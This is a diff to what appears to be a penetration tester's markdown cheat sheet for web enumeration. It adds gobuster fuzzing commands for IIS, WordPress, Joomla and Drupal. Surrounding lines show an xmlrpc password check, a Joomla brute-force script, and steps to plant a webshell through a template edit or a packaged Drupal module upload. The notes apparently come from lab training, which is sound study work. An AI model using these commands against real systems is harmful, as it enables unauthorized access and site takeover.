@@ -20,6 +20,8 @@ ffuf -k -u "$url/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_
 # If you get hits, try to discover more directories using a more niche wordlist
 
 # IIS Additional Fuzzing
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/iis-systemweb.txt -o $DIR/iis-systemweb-$1-$2.txt
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/IIS.fuzz.txt -o $DIR/IIS-fuzz-$1-$2txt
 java -jar iis_shortname_scanner.jar $url/ /opt/windows/IIS-ShortName-Scanner/release/config.xml
 java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
 egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt # If iis_.. returned TRANSF~1.ASP
@@ -208,6 +210,12 @@ Login.
 curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
 ```
 
+```bash
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -o $DIR/wordpress.txt
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -o $DIR/wpplugin.txt
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt -o $DIR/wpthemes.txt
+```
+
 #### Joomla
 
 - Fingerprint version from README.txt file, or from javascript files in "media/system/js/" directory, or navigating to "administrator/manifests/files/joomla.xml", "plugins/system/cache/cache.xml"
@@ -216,6 +224,11 @@ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><p
 droopescan scan joomla --url http://dev.inlanefreight.local/
 python2.7 joomlascan.py -u http://dev.inlanefreight.local
 sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
+
+```bash
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt -o $DIR/joomla-plugins.txt
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/joomla-themes.fuzz.txt -o $DIR/joomla-themes.txt
 ```
 
 - If logged in, customize template and insert webshell code
@@ -256,6 +269,11 @@ RewriteBase /
 mv shell.php .htaccess captcha
 tar cvf captcha.tar.gz captcha/
 # Manage -> extend -> + Install new module -> upload
+```
+
+```bash
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/drupal-themes.fuzz.txt -o $DIR/drupal-themes.txt
+gobuster dir -e -q -n -u http://$1:$2 -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/Drupal.txt -o $DIR/Drupal.txt
 ```
 
 #### Look at the cookies.. if there's a cookie name that you don't know, it could be coming from a plugin that has a vulnerability, such as pmpro_visit=1.
